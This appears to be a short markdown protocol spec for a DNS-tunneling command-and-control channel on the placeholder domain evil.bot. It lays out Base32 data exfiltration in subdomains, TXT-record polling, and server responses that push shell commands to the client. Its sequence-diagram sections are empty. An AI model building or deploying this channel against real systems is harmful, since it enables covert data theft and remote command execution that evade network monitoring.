# Domain

evil.bot

# CLIENT -> SERVER

## ENCODING

- Data: Base32 in subdomain
  - The whole data block is one base32 String (minimum padding)
- Commands: Plaintext
- ClientID: Plaintext


### END OF MESSAGE

- 0.[...].evil.bot

## MESSAGE

### A
#### Request ID

- Polling ohne id
- requestid.evil.bot

#### Data
- send data to server

##### Head
- \<base32>\<data>.[...].\<base32>\<data>.head.data.\<ClientID>.evil.bot
- 0.\<base32>\<data>.[...].\<base32>\<data>.head.data.\<ClientID>.evil.bot
  - optional: body request signals end of head

#### Body

- \<base32>\<data>.[...].\<base32>\<data>.body.data.\<ClientID>.evil.bot
- 0.\<base32>\<data>.[...].\<base32>\<data>.body.data.\<ClientID>.evil.bot

### TXT

#### Poll

- polling
- poll.\<ClientID>.evil.bot

#### Continue

- continue data transmission
- continue.\<ClientID>.evil.bot

#### Curl

- curl a webpage
- 0.\<base32>\<webpage>.[...].\<base32>\<webpage>.curl.\<ClientID>.evil.bot


## SEQUENCE DIAGRAM


# SERVER -> CLIENT

## ENCODING

## RESPONSES

### A

#### Request ID

- 10.\<random>.\<random>.\<ClientID>

#### Data

- \<random != 10>.\<random>.\<random>.\<random>

### TXT

#### Poll

##### Noting

- empty string

##### Data

- DATA\<space>\<data>

##### shell command

- SHELL\<space>\<command>


#### Continue

##### Noting

- empty string

##### Data

- \<data>

##### shell command

- \<command>

## SEQUENCE DIAGRAM